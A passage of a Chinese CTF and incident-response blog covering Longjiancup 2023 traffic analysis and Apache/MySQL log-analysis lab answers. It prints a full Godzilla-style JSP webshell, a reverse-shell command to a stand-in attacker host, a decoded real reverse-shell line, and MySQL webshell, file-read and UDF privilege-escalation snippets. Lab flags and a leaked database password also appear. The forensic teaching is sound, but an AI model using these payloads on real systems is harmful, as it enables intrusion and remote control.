source.zip\n```\n\n![image-20250422002720002](../image/achieve/202411/陇剑杯2023/image-20250422002720002.png)\n\n![image-20250422002735298](../image/achieve/202411/陇剑杯2023/image-20250422002735298.png)\n\n但是这个key是需要密码的，这个密码从哪来呢？\n\n我往上翻了一下发现有查看password的操作，猜测这个就是压缩包的密码\n\n![image-20250422002815511](../image/achieve/202411/陇剑杯2023/image-20250422002815511.png)\n\n```\n7e03864b0db7e6f9\n```\n\n输入密码果然是对的，成功拿到key的值\n\n```\nNSSCTF{7d9ddff2-2d67-4eba-9e48-b91c26c42337}\n```\n\n# [陇剑杯 2023]hard_web_1\n\n## #查看开放端口（TCP三次握手）\n\n问题：服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为NSSCTF{80,81,82,83})\n\n解题：\n\n先看看tcp的三次握手，用tcp.connection.synack 过滤器\n\n```\ntcp.connection.synack \n```\n\ntcp.connection.synack 主要用于识别 TCP 三次握手中的 SYN-ACK 包。这个过滤器用于显示 TCP 连接建立过程中的 SYN-ACK 数据包，也就是我们说的握手的第二步，服务器返回给客户端的数据包\n\n![image-20250422224654952](../image/achieve/202411/陇剑杯2023/image-20250422224654952.png)\n\n我们随便选个数据包看看\n\n![image-20250422225542593](../image/achieve/202411/陇剑杯2023/image-20250422225542593.png)\n\n这里的话给了源端口和目的端口，这里的源端口就是我们的服务器的端口，因为这是服务器发出的tcp数据包，那我们就看看有哪些端口就行了\n\n```\nNSSCTF{80,888,8888}\n```\n\n# [陇剑杯 2023]hard_web_2\n\n问题：服务器中根目录下的flag值是多少？NSSCTF{}\n\n解题：检索一下http的数据包\n\n发现攻击者进行了大量的目录扫描\n\n![image-20250423215716800](../image/achieve/202411/陇剑杯2023/image-20250423215716800.png)\n\n然后发现了一个数据包\n\n![image-20250422230537037](../image/achieve/202411/陇剑杯2023/image-20250422230537037.png)\n\n发现这里有cmd命令执行的口子，ls回显此时在根目录下的文件，我们继续往下看\n\n![image-20250422230623860](../image/achieve/202411/陇剑杯2023/image-20250422230623860.png)\n\n我们分析一下这个shell.jsp\n\n```javascript\n<%! \nString xc=\"748007e861908c03\"; //AES加密密钥\nclass X extends ClassLoader{//用于动态加载恶意类\n    public X(ClassLoader z) { super(z); }  // 继承父类 ClassLoader\n    public Class Q(byte[] cb) { return super.defineClass(cb, 0, cb.length); }  // 动态加载字节码\n}\n//AES加密和解密操作\npublic byte[] x(byte[] s, boolean m) {\n    try {\n        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");  // 获取 AES 加密实例\n        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));  // 初始化（1=加密，2=解密）\n        return c.doFinal(s);  // 执行加密/解密\n    } catch (Exception e) { return null; }\n}\n\n%>\n<%\ntry{\n    //读取HTTP请求体\n    byte[] data=new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];//获取 HTTP 请求的数据长度\n    java.io.InputStream inputStream= request.getInputStream();//获取HTTP请求的输入流，也就是发送的加密数据\n    int _num=0;\n    while ((_num+=inputStream.read(data,_num,data.length))<data.length);\n    data=x(data, false);//对数据进行AES解密\n    if (session.getAttribute(\"payload\")==null){//检查 session 里是否已经存储了恶意类。\n        session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));//用自定义的 ClassLoader（X 类）加载攻击者发送的 恶意字节码，并把加载的恶意类存入session\n    }else {\n    request.setAttribute(\"parameters\", data);  // 存储解密后的数据（攻击者的命令）\n    Object f = ((Class) session.getAttribute(\"payload\")).newInstance();  // 实例化恶意类\n    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();  // 准备输出流\n    f.equals(arrOut);  // 可能把输出流传给恶意类\n    f.equals(pageContext);  // 可能把 JSP 上下文传给恶意类\n    f.toString();  // 可能触发恶意代码执行\n    response.getOutputStream().write(x(arrOut.toByteArray(), true));  // 加密并返回结果\n}\n}catch (Exception e){}\n%>\n\n```\n\n很明显是哥斯拉webshell，因为这里对请求和响应进行了加密操作\n\n- 使用AES加密算法对请求和响应数据进行加密和解密操作，密钥为`748007e861908c03`。\n- 攻击者发送加密的命令，然后服务器解密后交给之前加载的恶意类去执行，并将结果加密返回\n- 加密后的数据通过HTTP请求体传输，攻击者收到加密的响应后进行解密拿到执行结果\n\n这个shell.jsp的文件是怎么来的呢？\n\n![image-20250423221859531](../image/achieve/202411/陇剑杯2023/image-20250423221859531.png)\n\n![image-20250423221841317](../image/achieve/202411/陇剑杯2023/image-20250423221841317.png)\n\n这个shell.jsp应该是之前目录探测的时候探测出来的\n\n因为数据是经过gzip压缩的，所以我们得换成二进制去看数据\n\n然后我们接着刚刚的数据流往下看\n\n![image-20250423222055379](../image/achieve/202411/陇剑杯2023/image-20250423222055379.png)\n\n这里就是利用webshell了，并且此时的响应返回了cookie\n\n![image-20250423222130556](../image/achieve/202411/陇剑杯2023/image-20250423222130556.png)\n","tags":["陇剑杯2023"],"categories":["赛题wp"]},{"title":"玄机第二章日志分析(二刷)","url":"/2025/04/21/玄机第二章日志分析(已做完)/","content":"\n# 0x01前言\n\n继续开始玄机第二章的学习\n\n感谢师傅的wp，讲的真的很详细\n\n[玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客](https://blog.csdn.net/administratorlws/article/details/139574366?ops_request_misc=%7B%22request%5Fid%22%3A%22b99b24403d7f7572af4ea5e29fd9f779%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-139574366-null-null.nonecase&utm_term=第一章&spm=1018.2226.3001.4450)\n\n[玄机——第二章 日志分析-apache日志分析 wp_第二章日志分析-apache日志分析-CSDN博客](https://blog.csdn.net/administratorlws/article/details/139574366?ops_request_misc=%7B%22request%5Fid%22%3A%22b99b24403d7f7572af4ea5e29fd9f779%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-5-139574366-null-null.nonecase&utm_term=第一章&spm=1018.2226.3001.4450)\n\n[玄机——第二章日志分析-redis应急响应 wp-CSDN博客](https://blog.csdn.net/administratorlws/article/details/140024637?ops_request_misc=%7B%22request%5Fid%22%3A%22b99b24403d7f7572af4ea5e29fd9f779%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-11-140024637-null-null.nonecase&utm_term=第一章&spm=1018.2226.3001.4450)\n\n# 0x01正文\n\n## 第二章日志分析-apache日志分析\n\n### **什么是apache日志分析？**\n\n日志分析是监控和优化网站性能、安全性和用户体验的重要手段。Apache日志分析是其中的一个重要组成部分，因为Apache是目前最流行的Web服务器之一。Apache日志记录了服务器上的各种活动，包括访问请求、错误信息、用户行为等。通过分析这些日志，可以获取有价值的信息，帮助网站管理员做出更好的决策。\n\n#### Apache日志分析\n\nApache日志分析是专门针对Apache HTTP服务器生成的日志文件进行分析。Apache服务器主要生成两种类型的日志文件：\n\n- 成功日志（access log）：\n\n\n记录了所有对Web服务器的请求，包括客户端IP地址、请求时间、请求方式、请求资源、响应状态码、数据传输量等。\n\n- 错误日志（error log）：\n\n记录了服务器在运行过程中遇到的错误和警告信息，包括启动和停止时的信息。\n\n#### 常见日志文件位置\n\n- Apache日志\n\n访问日志：默认位置通常是/var/log/apache2/access.log.1（Debian/Ubuntu）或/var/log/httpd/access_log.1（CentOS/RHEL）。\n错误日志：默认位置通常是/var/log/apache2/error.log.1（Debian/Ubuntu）或/var/log/httpd/error_log.1（CentOS/RHEL）。\n\n- SSH日志\n\n\n身份验证日志：通常位于/var/log/auth.log（Debian/Ubuntu）或/var/log/secure（CentOS/RHEL）。\n\n- 系统日志\n\n系统日志：通常位于/var/log/syslog（Debian/Ubuntu）或/var/log/messages（CentOS/RHEL）。\n\n### 问题1:提交当天访问次数最多的IP，即黑客IP\n\n首先我们要找到的是对应的日志文件，因为是Apache的日志分析，所以对应的Apache的目录就是/var/log/apache2/\n\n#### 解题\n\n因为是Apache的日志分析，所以我们先进入目录/var/log/apache2/\n\n```\ncd /var/log/apache2/\n```\n\n然后我们用ls-l看一下路径下文件的基本信息\n\n![image-20250421162558190](../image/achieve/202411/玄机第二章日志分析/image-20250421162558190.png)\n\n这里可以看到access.log和error.log的文件是空文件\n\n我们看一下access.log.1日志文件，发现内容特别多，我先把他传到物理机里\n\n```\nscp root@43.192.115.135:/var/log/apache2/access.log.1 物理机路径\n```\n\n然后用notepad打开\n\n![image-20250421163356238](../image/achieve/202411/玄机第二章日志分析/image-20250421163356238.png)\n\n我们先简单看一下，开头的话黑客估计是在访问页面的资源，而后黑客对目录进行了扫描操作，出现大量404\n\n![image-20250421163842875](../image/achieve/202411/玄机第二章日志分析/image-20250421163842875.png)\n\n或者在靶机里执行命令去检索\n\n```\ncut -d- -f 1 access.log.1|uniq -c | sort -rn | head -20\n```\n\n命令解释:\n\n- `ut`：这是一个命令行工具，用于从每一行中提取特定的部分。\n- `-d-`：指定字段的分隔符是`-`（一个连字符）。\n- `-f 1`：指定要提取第一个字段（即连字符前的部分）。\n- `access.log.1`：输入文件，假设这是Apache访问日志的文件名。\n- **`uniq -c`**:\n  - `uniq` 用于从输入中删除重复的行。\n  - `-c` 选项会在每行前加上一个计数，表示该行在输入中出现的次数。\n  - 注意，`uniq` 通常需要输入是已排序的，以便其有效地统计重复行。\n- **`sort -rn`**:\n  - `sort` 用于对输入行进行排序。\n  - `-r` 表示按递减顺序排序（reverse）。\n  - `-n` 表示按数值进行排序（numeric）。\n  - 这部分的作用是按照出现次数对 `uniq` 的输出进行从大到小的排序。\n- **`head -20`**:\n  - `head` 用于输出文件的开头部分。\n  - `-20` 指定输出前 20 行。\n  - 结果将是出现次数最多的前 20 个字段及其计数。\n\n![image-20250421163536713](../image/achieve/202411/玄机第二章日志分析/image-20250421163536713.png)\n\n或者也可以用之前的命令\n\n```\ncat access.log.1 | awk '{print $1}' | uniq -c | sort -nr | more\n```\n\n第一列就是访问的次数，可见第一个ip地址就是访问最多的黑客ip了\n\n```\nflag{192.168.200.2}\n```\n\n插入一个知识点就是关于cut和cat命令的区别\n\n##### cut和cat命令\n\ncat（concatenate）用于连接文件并打印到标准输出。通常用于查看文件的内容、合并文件和创建文件。\n\ncut用于从文件的每一行中提取指定的部分。通常用于处理列格式数据，比如从CSV文件中提取某些列。\n\n两者区别；\n\n- 用途不同：\n\n\ncat主要用于连接和显示文件内容。\n\ncut主要用于从文件中提取特定的列或字段。\n\n- 功能不同：\n\ncat可以将多个文件内容合并输出到一个文件或标准输出。\n\ncut可以根据指定的字符位置、字节位置或分隔符提取部分内容。\n\n- 常见用法不同：\n\ncat常用于快速查看文件内容或合并文件。\ncut常用于处理表格数据、日志文件等，需要提取特定列的数据。\n\n### 问题2:黑客使用的浏览器指纹是什么\n\n#### 什么是浏览器指纹\n\n浏览器指纹（Browser Fingerprinting）是指通过收集和分析浏览器和设备的特征信息，创建一个唯一的标识符，从而识别或跟踪用户。这种技术不仅仅依赖于常规的Cookie，还利用浏览器和设备的多种属性来进行识别。\n\n#### 常见的指纹\n\n浏览器类型和版本：使用的浏览器及其版本。\n操作系统：设备所运行的操作系统及其版本。\n时区：设备的时区设置。\n语言和区域设置：浏览器和操作系统的语言设置。\n屏幕分辨率和色深：设备屏幕的分辨率和颜色深度。\n插件和扩展：已安装的浏览器插件和扩展。\n字体：系统上安装的字体。\nHTTP头：浏览器在请求时发送的HTTP头信息，包括User-Agent、Accept、Accept-Language等。\nCanvas指纹：使用HTML5 Canvas元素绘制图形并分析生成的图像数据，以获取独特的图形渲染特征。\nWebGL指纹：利用WebGL的特性，通过绘制3D图形来获取设备的渲染特性。\n设备性能特征：CPU、GPU、内存等硬件信息。\n\n#### 使用浏览器指纹的目的\n\n追踪用户活动：在用户禁用Cookie或使用隐私保护工具时，仍然能够跟踪用户的在线活动。\n识别并避开安全系统：通过识别用户的浏览器指纹，可以绕过某些安全系统或反欺诈措施，假装成合法用户进行恶意活动。\n目标攻击：了解目标用户的设备和浏览器特性，从而制定更有针对性的攻击策略，比如利用特定浏览器或操作系统的已知漏洞进行攻击。\n\n#### 解题\n\n因为我们刚刚知道了黑客的ip，所以直接查看ip的信息就行了\n\n`cat access.log.1 |grep 192.168.200.2 |more`\n\n为什么这个命令能帮我们拿到指纹信息?\n\n- 它可以帮助你找到与特定 IP 地址相关的请求信息。这些请求通常包含在网络服务器的访问日志中，每个请求可能包含用户代理字符串（User-Agent），其中包含浏览器指纹信息。\n\n![image-20241117200431439](./../image/achieve/202411/玄机第二章日志分析/image-20241117200431439.png)\n\n```\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\n```\n\n可以看到，这里有很多一样的，直接md5加密交flag就行\n\n```\nflag{2d6330f380f44ac20f3a02eed0958f66}\n```\n\n### 问题3:查看index.php页面被访问的次数\n\n查看页面访问情况，也是可以用之前的命令的\n\n#### 解题流程:\n\n```\ncat access.log.1| grep -a 'index.php' \n```\n\n这将输出所有包含 index.php 的访问记录。\n\n使用 wc -l 命令统计行数\nwc -l 命令用于统计行数，即访问次数。\n\n```\ncat access.log.1| grep -a 'index.php'  | wc -l\n```\n\n这个命令会输出包含 index.php 的访问记录的总行数，即 index.php 被访问的次数。\n所以我们的命令:\n\n```\ncat access.log.1| grep -a '/index.php' | wc -l\n```\n\n但是值得注意的是，当我们使用cat，一定得是/index.php文件表示当前目录下的index.php，因为这个文件很普遍所以我们还是严谨一点比较好\n\n![image-20250421164724063](../image/achieve/202411/玄机第二章日志分析/image-20250421164724063.png)\n\n可以看到是27次，直接交flag\n\n```\nflag{27}\n```\n\n但是不对啊，我们再看看包含index.php的记录有哪些\n\n![image-20250421165214789](../image/achieve/202411/玄机第二章日志分析/image-20250421165214789.png)\n\n发现两个并非访问/index.php的记录，那最后就是25次\n\n```\nflag{25}\n```\n\n这次对了\n\n### 问题4：查看黑客IP访问了多少次\n\n因为我们已经知道了黑客ip，所以直接下手就行\n\n#### 解题\n\n##### 第一种命令\n\n```\ncat access.log.1 | grep “192.168.200.2 - -” | wc -l\n```\n\n- grep \"192.168.200.2 - -\":\n\n从 cat 命令输出的内容中通过grep筛选出包含字符串 192.168.200.2 - - 的行。这通常意味着你在查找某个特定 IP 地址的访问记录。\n\n- wc -l:\n\n统计通过 grep 筛选出的行数，即包含 192.168.200.2 - - 的行数。\n\n那为什么这里是--呢?\n\n在 Apache 访问日志中，格式通常是标准的组合日志格式（Combined Log Format），包含了客户端 IP 地址、客户端身份验证信息、用户 ID、请求时间、请求行、状态码、响应大小、引用来源和用户代理等信息。以下是一个典型的日志条目：\n\n例如；\n\n192.168.200.2 - - [03/Aug/2023:08:00:00 +0000] \"GET /index.php HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n在这个日志条目中，`192.168.200.2` 是客户端 IP 地址，`- -` 是占位符，表示客户端身份验证信息（客户端身份验证信息为空时用 `-` 表示）。\n\n当然这里也可以用grep -w \"192.168.200.2\" access.log.1 |wc -l，因为-w参数可以进行全匹配\n\n##### 第二种命令\n\n```\ncat access.log.1 | grep \"192.168.200.2\" | cut -d' ' -f1 | sort | uniq -c\n```\n\n作用:这个命令 cat access.log.1 | grep \"192.168.200.2\" | cut -d' ' -f1 | sort | uniq -c 的作用是从 access.log.1 文件中筛选出指定 IP 地址的访问记录，并统计每个 IP 地址的出现次数。\n\n- cut -d' ' -f1：\n\n\ncut 命令用于从每行中提取指定的字段。\n\n-d' ' 表示字段分隔符是空格。\n\n-f1 表示提取第一个字段，即 IP 地址。\n\n- sort：\n\nsort 命令用于对输入内容进行排序。\n\n这里它对提取出的 IP 地址进行排序。\n\n- uniq -c：\n\nuniq 命令用于去除重复的行。\n-c 选项表示在输出中包含每个唯一行前出现的次数。\n这里它统计每个唯一 IP 地址出现的次数。\n\n#### 总结：\n\n- 读取日志文件：\n\n\n使用 cat 命令读取 access.log.1 的内容。\n\n- 过滤特定 IP 的访问记录：\n\n使用 grep \"192.168.200.2\" 筛选出包含指定 IP 地址的行。\n\n- 提取 IP 地址：\n\n使用 cut -d' ' -f1 提取每一行的第一个字段，即 IP 地址。\n\n- 排序：\n\n使用 sort 对提取出的 IP 地址进行排序，以便 uniq 能够正确统计连续出现的相同 IP 地址。\n\n- 统计出现次数：\n\n使用 uniq -c 统计每个唯一 IP 地址出现的次数，并在每个 IP 地址前显示其出现的次数。\n\n##### 第三个命令\n\n```\ngrep \"192.168.200.2\" access.log.1 | cut -d' ' -f1 | sort | uniq -c\n```\n\n- cut -d' ' -f1：\n\n\ncut 命令用于从每行中提取指定的字段。\n\n-d' ' 表示字段分隔符是空格。\n\n-f1 表示提取第一个字段，即提取每行的第一个字段。\n\n在典型的访问日志格式中，第一字段通常是 IP 地址，所以这一步提取出所有包含 IP 地址 192.168.200.2 的记录的 IP 地址部分。\n\n- sort：\n\nsort 命令用于对输入内容进行排序。\n\n这里它对提取出的 IP 地址进行排序，以便 uniq 能够正确统计连续出现的相同 IP 地址。\n\n排序是为了后续步骤中的去重和计数。\n\n- uniq -c：\n\nuniq 命令用于去除重复的行。\n\n-c 选项表示在输出中包含每个唯一行前出现的次数。\n\n这里它统计每个唯一 IP 地址出现的次数，并在每个 IP 地址前显示其出现的次数。\n\n- 简单来说就是；\n\n过滤：使用 grep 筛选包含指定 IP 地址 192.168.200.2 的日志记录。\n\n提取字段：使用 cut 提取每行的第一个字段，即 IP 地址部分。\n\n排序：使用 sort 对提取出的 IP 地址进行排序。\n\n统计：使用 uniq -c 统计每个 IP 地址的出现次数。\n\n- 区别\n\n这两个命令的主要区别在于是否使用了 cat 命令，这个不用我多说了吧？：\n\n1.grep \"192.168.200.2\" access.log.1 | cut -d' ' -f1 | sort | uniq -c：\n\n直接使用 grep 从文件 access.log.1 中搜索包含 192.168.200.2 的行。\n后续步骤提取、排序和统计。\n2.cat access.log.1 | grep \"192.168.200.2\" | cut -d' ' -f1 | sort | uniq -c：\n\n先使用 cat 命令读取整个文件 access.log.1，然后将内容通过管道传递给 grep 进行搜索。\n\n后续步骤与上一个命令相同。\n\n- 主要区别\n\n使用 cat：第一条命令直接使用 grep 读取文件，避免了 cat 的额外步骤，更加简洁高效。\n不使用 cat：第二条命令多了一步 cat，从功能上讲没有必要，因为 grep 可以直接读取文件内容。\n![image-20250421165605174](../image/achieve/202411/玄机第二章日志分析/image-20250421165605174.png)\n\n最终就是6555次，提交flag就行\n\n### 问题5：查看2023年8月03日8时这一个小时内有多少IP访问\n\n这里的话是具体到时间段了；\n\n首先我们得先把日期换成日志里的格式**2023年8月03日8时——03/Aug/2023:08:**\n\n#### 解题\n\n还是一样的三个命令\n\n##### 第一种命令\n\n```\ncat access.log.1 | grep \"03/Aug/2023:08:\" | awk '{print $1}'| sort -nr| uniq -c|wc -l\n```\n\n![image-20250421170314021](../image/achieve/202411/玄机第二章日志分析/image-20250421170314021.png)\n\n##### 第二种命令\n\n```\ncat access.log.1 | grep \"03/Aug/2023:08:\" | awk '{print $1}'| sort -nr| uniq -c\n```\n\n这里细心的人就会发现了，哎，怎么这个和上面就少一个wc -l啊？\n\n**区别在于；**（看需要加与不加）\n\n- **不加 `wc -l`**：显示每个 IP 地址的访问次数。\n- **加上 `wc -l`**：显示不同 IP 地址的总数量。\n\n##### 第三种命令\n\n```\ngrep “03/Aug/2023:08:” access.log.1 | awk ‘{print $1}’ | sort -nr | uniq -c | wc -l\n```\n\n命令其实都大差不差，主要的步骤就是\n\n1. 从日志文件中筛选特定时间段的日志行。\n2. 提取 IP 地址。\n3. 对 IP 地址进行排序。\n4. 统计每个 IP 地址的出现次数。\n5. 计算不同 IP 地址的数量。\n\n这里只写了一个命令的示范，剩下的就自己去实践了哈\n\n## 第二章日志分析-mysql应急响应\n\n### 什么是mysql\n\nMySQL 是一种开源关系型数据库管理系统（RDBMS），通常用于存储和管理数据。以下是关于 MySQL 的一些关键点：\n\n基本概念\n\n- **关系型数据库管理系统**：\n  - MySQL 使用表格来存储数据，这些表可以通过关系进行关联。关系型数据库的结构化查询语言（SQL）用于定义、查询、和管理数据。\n- **开源软件**：\n  - MySQL 是开源的，意味着它的源代码是公开的，用户可以自由使用、修改和分发。MySQL 也是 Oracle 公司的一部分。\n\n### 什么是mysql应急响应\n\n**MySQL应急响应是指在MySQL数据库遇到故障、入侵或其他紧急情况时，采取的一系列快速、有效的措施，以确保数据库的完整性、安全性和可用性，这里我们主要分析的是日志信息，里面记录黑客入侵的大部份信息。**\n\n### 问题1：黑客第一次写入的shell\n\n看到这个的话，很难不想到第一章里面的webshell查杀的内容，我们这里就不赘述了，需要的师傅可以直接去第一章中查看\n\n#### 解题\n\n我们先去/var/www/html里面的看看有没有吗，为什么呢\n\n因为既然黑客要在mysql里写入shell，那么首先他一定是先拿下了网站，并上传了shell，第一次写入的shell，我们可以去web目录下查找一番\n\n所以我们可以先在web目录里面收查一下\n\n![image-20241117205810653](./../image/achieve/202411/玄机第二章日志分析/image-20241117205810653.png)\n\n发现了一个.sh.php文件，我们cat看一下\n\n![image-20241117205931629](./../image/achieve/202411/玄机第二章日志分析/image-20241117205931629.png)\n\n从这个1 2 4能看出来是通过数据库注入写入的webshell, 注入点为表第三个字段\nflag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}\n\n### 问题2:黑客反弹shell的ip\n\n##### 什么是反弹shell\n\n反弹 Shell（Reverse Shell）是一种通过网络连接建立的 Shell 会话，通常用于远程控制计算机系统。在反弹 Shell 中，被攻击的机器主动向攻击者的机器发起连接，这与传统的“绑定 Shell”（Bind Shell）有区别，其中攻击者连接到目标机器上开放的端口。\n\n##### 反弹shell的原理\n\n反弹Shell（Reverse Shell）的原理是攻击者通过在目标系统上运行恶意代码，使得目标系统主动与攻击者的控制服务器建立连接，从而绕过防火墙和其他安全措施。\n\n反弹Shell的工作原理\n\n- 攻击者准备监听：攻击者在其控制的服务器上启动一个监听程序（通常是一个Netcat或类似工具），等待目标系统主动连接。\n\n\nnc -lvp 4444\n\n这里，-l表示监听模式，-v表示冗长输出，-p指定端口。\n\n- 目标系统执行恶意代码：攻击者通过漏洞利用、社交工程等手段，在目标系统上执行恶意代码。这段代码会打开一个Shell，并尝试连接攻击者的服务器。\n\n\n/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1\n\n这个命令的作用是通过TCP连接攻击者的IP地址和端口，并将输入和输出重定向到这个连接上。\n\n- 建立连接：目标系统主动向攻击者的服务器发起连接请求。由于是目标系统主动连接，一般不会被防火墙阻拦。\n\n\n- 攻击者获得Shell访问：一旦连接建立，攻击者就可以在其控制服务器上得到一个远程Shell，能够像在本地终端一样执行命令，控制目标系统。\n\n\n如果要找出黑客反弹的shell，我们就得从日志中进行分析了\n\n#### 基本步骤\n\n- 检查日志文件：查看MySQL的日志文件，特别是查询日志和错误日志。这些日志可以提供关于执行的查询和任何异常情况的信息。\n\n查询日志：记录所有的查询，包括成功和失败的查询。\n错误日志：记录MySQL服务器的错误、警告和通知。\n这些日志通常位于/var/log/mysql/目录下。\n\n- 检查审计日志：如果启用了审计插件，可以查看审计日志。MySQL Enterprise Edition包含一个审计插件，可以记录所有SQL查询。\n\n\n- 检查连接历史：检查MySQL中的连接历史，找出哪些IP地址连接过数据库。可以通过查询information_schema.processlist或performance_schema来获取连接信息。\n\n\n- 检查特定的表和列：查找数据库中是否有存储和执行恶意命令的痕迹，例如system或exec等。\n\n\n#### 解题\n\n所以我们先进入/var/log/mysql/目录，然后看看里面都有什么文件，发现只有一个error.log,我们查看这个文件后慢慢分析可以得到\n\n```\ntmp/1.sh: line 1: --2023-08-01: command not found\n/tmp/1.sh: line 2: Connecting: command not found\n/tmp/1.sh: line 3: HTTP: command not found\n/tmp/1.sh: line 4: Length:: command not found\n/tmp/1.sh: line 5: Saving: command not found\n/tmp/1.sh: line 7: 0K: command not found\n/tmp/1.sh: line 9: syntax error near unexpected token `('\n/tmp/1.sh: line 9: `2023-08-01 02:16:35 (5.01 MB/s) - '1.sh' saved [43/43]'\n```\n\n这段日志表明有人尝试在MySQL服务器上执行一个位于/tmp/1.sh的shell脚本，但是该脚本的内容并非有效的shell命令或脚本格式，而是看起来像HTTP响应或者是一个下载日志的内容。每行的错误信息，如command not found，指出脚本中的每一行都被解释器当作命令来尝试执行，但由于这些行实际上是HTTP响应的一部分（例如日期、状态信息、长度描述等），shell无法识别并执行它们，从而导致了一系列的错误。\n\n发现日志中 /tmp/1.sh 脚本的执行错误，发现后面也是由这个文件引起的一系列报错信息，那这里我们就可以尝试定位这个文件，看看里面到底是什么为什么会引起那么多报错信息；\nfind / -name \"1.sh\"\n\n![image-20241117211539930](./../image/achieve/202411/玄机第二章日志分析/image-20241117211539930.png)\n\n发现在tmp目录也发现了这个文件，我们去看看\n\n**![image-20241117211713956](./../image/achieve/202411/玄机第二章日志分析/image-20241117211713956.png)**\n\n这是一条反弹shell的命令\n\n命令解析\n\n- bash -i：\n\n\n以交互模式启动一个新的Bash Shell。-i参数表示交互式Shell，这样可以确保Shell会读取并执行启动文件，如.bashrc。\n\n- & /dev/tcp/192.168.100.13/777：\n\n使用Bash的特殊文件重定向语法，通过TCP连接到IP地址192.168.100.13和端口777。\n\n& 表示将标准输出（stdout）和标准错误（stderr）都重定向到 /dev/tcp/192.168.100.13/777，这个特殊文件实际上是在通过TCP连接发送数据。\n\n- 0>&1：\n\n将标准输入（stdin）重定向到标准输出（stdout），这样可以将所有输入从TCP连接中读取并执行。\n\n### 问题3：黑客提权文件的完整路径\n\n在做这个题目之前，我们应该了解到**在 MySQL 提权攻击中，最常用的一些方法包括利用 `INTO OUTFILE` 写入文件、利用 `LOAD_FILE` 读取文件，以及利用 UDF（用户定义函数）执行系统命令。这些方法因其简单高效、攻击面广而被广泛采用。**\n\n#### 三种mysql提权攻击\n\n- 利用 INTO OUTFILE 写入文件\n\n\nINTO OUTFILE 是 MySQL 提供的一个功能，允许将查询结果写入服务器上的文件。如果攻击者能成功利用这个功能，他们可以将恶意代码写入 Web 服务器目录，生成一个 Web Shell。\n\n示例：\n\nSELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\n\n这个命令将在 /var/www/html/ 目录下创建一个名为 shell.php 的文件，包含一个简单的 Web Shell，攻击者可以通过访问该文件执行任意系统命令。\n\n- 利用 LOAD_FILE 读取文件\n\n\nLOAD_FILE 是 MySQL 提供的另一个功能，允许读取服务器上的文件内容。攻击者可以利用这个功能读取敏感文件，如系统密码文件 /etc/passwd。\n\n示例：\n\nSELECT LOAD_FILE('/etc/passwd');\n\n这个命令会返回 /etc/passwd 文件的内容，其中包含所有用户的信息。\n\n- 利用 UDF 执行系统命令\n\n\nUDF（用户定义函数）允许用户扩展 MySQL 的功能。如果攻击者可以将恶意的共享库上传到服务器，他们可以利用 UDF 执行任意系统命令。\n\n示例步骤：\n\n上传恶意共享库 lib_mysqludf_sys.so 到 MySQL 服务器的插件目录。\n\n创建 UDF 函数：\n\n​\tCREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';\n\n使用 UDF 执行系统命令：\n\n​\tSELECT sys_exec('id > /tmp/output.txt');\n\n这个命令将在 /tmp 目录下创建一个文件 output.txt，其中包含执行 id 命令的结果。\n\n**常用方法总结**\nINTO OUTFILE 写入文件：常用于创建 Web Shell 或写入恶意脚本。\nLOAD_FILE 读取文件：常用于读取敏感文件，进行信息收集。\nUDF 执行系统命令：常用于执行任意系统命令，获取更高权限。\n\n#### 解题\n\n那让我们来思考一下黑客进攻的流程，他做过反弹 shell 的操作，并且做过提权操作，既然是从数据库权限提权到主机用户权限，那肯定是通过数据库服务打过来的，既然黑客进行了提权，说明黑客肯定拿到了mysql账号和密码并且成功登录，那么我们可以猜想是否在web目录下有页面泄露账号密码\n\n**那我们这里直接跟进到目录/var/www/html定位账号“root”看看我们能不能发现密码，也来验证一遍我们的猜想**\n\nfind ./ -name \"*.php\" | xargs grep \"root\"\n\n![image-20241117212910722](./../image/achieve/202411/玄机第二章日志分析/image-20241117212910722.png)\n\nk可以看到进行了mysql的账号密码连接\n\n简单分析一下这段代码\n\n- **localhost”**：数据库服务器地址，这里是本地主机。\n- **“root”**：数据库用户名。\n- **“334cc35b3c704593”**：数据库密码。\n- **“cms”**：数据库名称。\n- **“3306”**：数据库端口号。\n\n然后我们也发现了是commom.php泄露的账号密码，我们就先连上数据库分析一下\n\n```\nmysql -uroot -p334cc35b3c704593\n```\n\n-u：用户\n-p：密码\n\n连进去后就简单看一下数据库的设置，这样可以更好的知道黑客到底有没有进行UDF提权\n\n```\nshow global variables like '%secure%';\n```\n\n![image-20241117213252122](./../image/achieve/202411/玄机第二章日志分析/image-20241117213252122.png)\n\n简单分析一下；\n\n**`show global variables like '%secure%';` 是一条 MySQL 查询命令，用于显示与 “secure” 相关的全局变量及其当前设置。通过查看这些变量的配置，可以帮助我们了解 MySQL 服务器的安全性设置和限制。**\n\nzhi行命令后可能会有以下类似的结果\n\n```\n+----------------------------+------------------------+\n| Variable_name              | Value                  |\n+----------------------------+------------------------+\n| require_secure_transport   | OFF                    |\n| secure_auth                | ON                     |\n| 